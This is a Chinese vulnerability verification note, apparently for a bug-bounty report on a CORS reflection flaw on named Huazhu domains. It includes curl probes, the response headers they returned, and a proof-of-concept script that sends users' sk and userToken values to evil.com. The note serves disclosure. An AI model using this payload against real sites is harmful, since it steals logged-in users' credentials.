# portalapi.huazhu.com CORS反射型漏洞 (2026-05-18 验证)

## 验证状态: CONFIRMED

## 关键证据

### portalapi.huazhu.com

请求:
curl -sk -D- 'https://portalapi.huazhu.com/' -H 'Origin: https://evil.com'

响应头(关键):
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: Origin, No-Cache, X-Requested-With, If-Modified-Since, Pragma, Last-Modified, Cache-Control, Expires, Content-Type, X-E4M-With, version, Client-Platform, User-Token, V-Id, Frontend-Sparams, traceparent, tracestate
Access-Control-Expose-Headers: Date, sk, userToken
Access-Control-Allow-Credentials: true
XDomainRequestAllowed: 1
Server: APISIX
```

响应body:
```json
{"status":200,"data":"2026-05-18 16:36:02","message":"success","redirectUrl":null}
```

### customer.huazhu.com

请求:
curl -sk -D- 'https://customer.huazhu.com/' -H 'Origin: https://evil.com'

响应头(关键):
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Date, sk, userToken, SK
Server: APISIX
```

响应body:
```json
{"timestamp":"2026-05-18 16:36:03","status":404,"error":"Not Found","message":"No message available","path":"/"}
```

### signin.hworld.com

状态: 无法验证 - 腾讯云WAF拦截所有请求返回403
WAF UUID: 9e57d930f465630834a6f4f946b2f559

## CORS利用POC

```html
<script>
fetch('https://portalapi.huazhu.com/', {
  credentials: 'include'
}).then(r => {
  var sk = r.headers.get('sk');
  var userToken = r.headers.get('userToken');
  // 发送到攻击者服务器
  fetch('https://evil.com/collect?sk=' + sk + '&token=' + userToken);
});
</script>
```

## 危害
- Access-Control-Expose-Headers暴露sk和userToken认证头
- 浏览器会自动携带Cookie(Credentials=true)
- 攻击者可窃取已登录用户的完整认证凭证

## 报告教训
- signin.hworld.com被WAF拦截后,替换为portalapi.huazhu.com作为主报告域名
- 企业SRC要求完整HTTP数据包(curl -D-输出),不能只有描述
- CORS报告必须包含POC页面代码,证明浏览器可直接利用
